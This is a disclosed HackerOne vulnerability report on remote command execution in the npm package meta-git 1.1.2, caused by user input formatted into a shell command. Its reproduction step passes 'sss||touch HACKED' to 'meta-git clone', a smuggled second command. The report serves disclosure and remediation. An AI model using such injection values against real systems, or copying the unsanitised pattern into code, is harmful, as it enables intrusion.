# [meta-git] RCE via insecure command formatting

## Report Details
- **Report ID**: 728040
- **URL**: https://hackerone.com/reports/728040
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2019-11-02T22:14:33.047Z
- **Disclosed**: 2020-01-11T11:57:31.528Z

## Reporter
- **Username**: mik317
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report a `RCE` issue in the `meta-git` module.
It allows to execute `arbitrary commands remotely inside the victim's PC`

# Module
**module name:** `meta-git`
**version:** `1.1.2`
**npm page:** `https://www.npmjs.com/package/meta-git`

## Module Description
> git plugin for meta

## Module Stats
[~60] downloads in the last day
[429] downloads in the last week
[~2k] downloads in the last month

## Vulnerability Description
The issue occurs because a `user input` is formatted inside a `command` that will be executed without any check. The issue arises here: https://github.com/mateodelnorte/meta-git/blob/master/lib/metaGitUpdate.js#L49

## Steps To Reproduce:
1. Create a new directory and insert some test files:

```bash
mkdir tests
cd tests
touch test
touch secret
touch files
```
1. Check there aren't files called `HACKED` 
1. Execute the following commands in another terminal:

```bash
npm i meta-git -g # Install affected module
meta-git clone 'sss||touch HACKED' # *HACKED* file is created
```
1. Recheck the files: now `HACKED` has been created :) {F624209}

## Patch
> Don't format `commands` using insecure `user's inputs` :)

## Supporting Material/References:
- [OPERATING SYSTEM VERSION]: Kali Linux
- [NODEJS VERSION]: 10.16.3
- [NPM VERSION]: 6.0.9

# Wrap up
- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

`RCE` via command formatting on `meta-git`

## Attachments
- Screenshot_from_2019-11-02_23-08-42.png
